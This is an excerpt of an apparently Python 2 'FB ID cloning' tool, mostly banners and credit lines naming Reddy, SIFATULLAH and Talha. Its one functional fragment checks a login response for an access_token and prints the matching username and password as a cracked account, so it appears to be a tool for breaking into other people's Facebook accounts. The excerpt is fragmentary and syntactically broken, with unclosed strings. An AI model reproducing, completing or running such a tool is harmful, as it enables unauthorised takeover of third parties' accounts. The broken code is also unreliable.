...
print("this tool is free by MR Reddy")

print

psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY MR Reddy.......ANY ONE COPY THIS CODE! CREDIT ME ........PROGRAMING BY Reddy......................................OPENING.............')
...
\__|  \__|\________|\_______/ \_______/    \__|    
...
_____________________________/ Author: Programing by Reddy
...
def menu():
    ...
    print'FB OLD ID CLONING [Programer by Reddy]'

    print 50* '-'

    print 'Codder.  : SIFATULLAH

    print 'AUTHOR   : SIFATULLAH'

    print 'YOUTUBE : SIFATULLAH

    print 'GITHUB   : MR Reddy'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[TALHA-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(Talha)Open After 10 Days]\x1b[0m \n'
